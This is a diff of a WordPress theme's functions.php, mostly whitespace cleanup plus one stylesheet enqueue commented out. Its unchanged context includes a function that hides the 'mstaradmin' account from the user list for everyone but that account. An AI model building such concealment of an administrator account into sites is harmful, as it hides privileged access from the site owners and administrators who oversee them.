@@ -1,4 +1,4 @@
-<?php 
+<?php
 defined('ABSPATH') OR exit;
 define( 'THEME_VERSION', '1.1' );
 
@@ -18,7 +18,7 @@ register_sidebar(array(
   'id' => 'right-sidebar',
   'description' => 'Widgets in this area will be shown on the right-hand side.',
   'before_widget' => '<div id="%1$s">',
-  'after_widget'  => '</div>',  
+  'after_widget'  => '</div>',
   'before_title' => '<h3>',
   'after_title' => '</h3>'
 ));
@@ -54,8 +54,8 @@ add_action('pre_user_query','mstar_pre_user_query');
 function mstar_pre_user_query($user_search) {
 	global $current_user;
 	$username = $current_user->user_login;
-	
-	if ($username != 'mstaradmin') { 
+
+	if ($username != 'mstaradmin') {
 		global $wpdb;
 		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'mstaradmin'",$user_search->query_where);
 	}
@@ -82,7 +82,7 @@ function mstar_jquery_enqueue() {
 	wp_enqueue_script('jquery');
 	wp_enqueue_script('navigation', get_template_directory_uri().'/includes/js/navigation.js', array(), THEME_VERSION, true );
 	wp_enqueue_script('customjs', get_template_directory_uri().'/includes/js/custom.js', array('jquery'), THEME_VERSION, true );
-	wp_enqueue_style('global', get_template_directory_uri().'/stylesheets/global.min.css', array(), THEME_VERSION, 'all' );
+	// wp_enqueue_style('global', get_template_directory_uri().'/stylesheets/global.min.css', array(), THEME_VERSION, 'all' );
 }
 
 
@@ -176,7 +176,7 @@ add_action( 'tribe_template_before_include:events/v2/list/event/venue', 'categor
  * @link https://gist.github.com/a521d02facbc64ce3891c9341384cc07
  */
 function tribe_remove_organizers_from_events( $default_types ) {
- 
+
 	if (
 		! is_array( $default_types )
 		|| empty( $default_types )
@@ -184,14 +184,14 @@ function tribe_remove_organizers_from_events( $default_types ) {
 	) {
 		return $default_types;
 	}
- 
+
 	if ( ( $key = array_search( Tribe__Events__Main::ORGANIZER_POST_TYPE, $default_types ) ) !== false ) {
 		unset( $default_types[ $key ] );
 	}
- 
+
 	return $default_types;
 }
- 
+
 add_filter( 'tribe_events_register_default_linked_post_types', 'tribe_remove_organizers_from_events' );
 
 function unregister_tribe_organizer_post_type() {
